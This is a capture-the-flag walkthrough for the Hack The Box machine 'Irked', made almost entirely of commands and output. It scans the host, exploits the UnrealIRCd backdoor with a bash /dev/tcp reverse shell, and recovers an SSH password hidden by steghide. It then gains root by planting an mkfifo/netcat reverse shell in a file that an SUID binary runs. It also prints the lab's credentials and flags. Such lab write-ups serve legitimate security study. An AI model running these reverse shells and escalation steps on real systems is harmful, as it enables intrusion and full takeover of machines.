# irked <br> <https://app.hackthebox.com/machines/Irked>

```bash
nmap -sC -sV 10.10.10.117 -oA nmap.initial -Pn

Nmap scan report for 10.10.10.117
Host is up (0.085s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          40043/udp   status
|   100024  1          40964/udp6  status
|   100024  1          43392/tcp6  status
|_  100024  1          46509/tcp   status
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
nmap -sC -sV 10.10.10.117 -vvv -p- -oA nmap.full -Pn

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp    open  http    syn-ack Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          40043/udp   status
|   100024  1          40964/udp6  status
|   100024  1          43392/tcp6  status
|_  100024  1          46509/tcp   status
6697/tcp  open  irc     syn-ack UnrealIRCd
8067/tcp  open  irc     syn-ack UnrealIRCd
46509/tcp open  status  syn-ack 1 (RPC #100024)
65534/tcp open  irc     syn-ack UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
cat /etc/hosts | grep irked              
10.10.10.117	irked.htb
```

```bash
sudo apt install pidgin
```

```bash
cat /etc/hosts | grep irked
10.10.10.117	irked.htb irc.irked.htb
```

```bash
searchsploit UnrealIRCd 

echo "AB; bash -c 'bash -i >& /dev/tcp/10.10.14.8/9995 0>&1'" | nc irc.irked.htb 8067

#netcat setup for the reverse shell
nc -lvnp 9995
```

```bash
ircd@irked:/home/djmardov/Documents$ cat .backup
cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss

```

```bash
steghide  extract -sf irked.jpg 
Enter passphrase: 
wrote extracted data to "pass.txt".

cat pass.txt                         
Kab6h+m+bbp2J:HG
```

```bash
ssh djmardov@irked.htb  

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 15 08:56:32 2018 from 10.33.3.3
djmardov@irked:~$ 

djmardov@irked:~$ cat user.txt 
1b2b6574db81cfeb6379004e94084448
```

**Privilege Escalation**
```bash
ls                   
linpeas.sh
python3 -m http.server 9999

djmardov@irked:/tmp$ wget 10.10.14.8:9999/linpeas.sh
djmardov@irked:/tmp$ chmod +x linpeas.sh 
djmardov@irked:/tmp$ ./linpeas.sh 

...
-rwsr-xr-x 1 root root 7.2K May 16  2018 /usr/bin/viewuser (Unknown SUID binary!)
...
```

```bash
djmardov@irked:/tmp$ ls -la /usr/bin/viewuser
-rwsr-xr-x 1 root root 7328 May 16  2018 /usr/bin/viewuser
djmardov@irked:/tmp$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2023-03-18 11:29 (:0)
djmardov pts/0        2023-03-19 02:57 (10.10.14.8)
sh: 1: /tmp/listusers: not found
```

```bash
djmardov@irked:~$ cd /tmp
djmardov@irked:/tmp$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.8 9797 >/tmp/f" > /tmp/listusers
djmardov@irked:/tmp$ chmod 777 /tmp/listusers
djmardov@irked:/tmp$ /usr/bin/viewuser

nc -lvnp 9797
listening on [any] 9797 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.117] 32842
# id
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
# cat /root/root.txt 
525e7432d7eed89feda57223ddd100b4
```

***References*** <br>
<https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind> <br>
<https://www.exploit-db.com/exploits/13853> <br>
<https://www.revshells.com>
